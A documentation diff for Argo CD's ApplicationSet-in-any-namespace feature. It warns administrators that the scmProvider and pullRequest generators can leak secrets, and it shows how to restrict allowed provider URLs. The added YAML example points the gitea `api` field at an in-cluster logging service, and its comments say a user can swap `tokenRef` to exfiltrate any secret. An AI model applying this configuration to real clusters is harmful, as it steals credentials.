@@ -23,9 +23,9 @@ This feature needs [App in any namespace](../app-any-namespace.md) feature activ
 
 This feature can only be enabled and used when your Argo CD ApplicationSet controller is installed as a cluster-wide instance, so it has permissions to list and manipulate resources on a cluster scope. It will *not* work with an Argo CD installed in namespace-scoped mode.
 
-### Scm Providers secrets consideration
+### SCM Providers secrets consideration
 
-By allowing ApplicationSet in any namespace you must be aware that any secrets can be exfiltrated using scmProvider or pullRequest generators.
+By allowing ApplicationSet in any namespace you must be aware that any secrets can be exfiltrated using `scmProvider` or `pullRequest` generators.
 
 Here is an example:
 
@@ -40,23 +40,34 @@ spec:
       gitea:
         # The Gitea owner to scan.
         owner: myorg
-        # The Gitea instance url
-        api: https://gitea.mydomain.com/
+        # With this malicious setting, user can send all request to a Pod that will log incoming requests including headers with tokens
+        api: http://my-service.my-namespace.svc.cluster.local
         # If true, scan every branch of every repository. If false, scan only the default branch. Defaults to false.
         allBranches: true
-        # Reference to a Secret containing an access token. (optional)
+        # By changing this token reference, user can exfiltrate any secrets
         tokenRef:
           secretName: gitea-token
           key: token
   template:
 ```
 
-By setting `spec.generators[n].scmProvider.gitea.api=http://my-service.my-namespace.svc.cluster.local` user can send all request to a Pod that will log incoming requests including headers with tokens. By changing the `tokenRef` user can read in clear all secrets.
-
 Therefore administrator must restrict the urls of the allowed SCM Providers (example: `https://git.mydomain.com/,https://gitlab.mydomain.com/`) by setting the environment variable `ARGOCD_APPLICATIONSET_CONTROLLER_ALLOWED_SCM_PROVIDERS` to argocd-cmd-params-cm `applicationsetcontroller.allowed.scm.providers`. If another url is used, it will be rejected by the applicationset controller.
 
-## Implementation details
 
+For example:
+```yaml
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: argocd-cmd-params-cm
+data:
+  applicationsetcontroller.allowed.scm.providers: https://git.mydomain.com/,https://gitlab.mydomain.com/
+```
+
+> Please note url used in the `api` field of the `ApplicationSet` must match the url declared by the Administrator including the protocol
+
+## Implementation details
+Scm
 ### Overview
 
 In order for an ApplicationSet to be managed and reconciled outside the Argo CD's control plane namespace, two prerequisites must match:
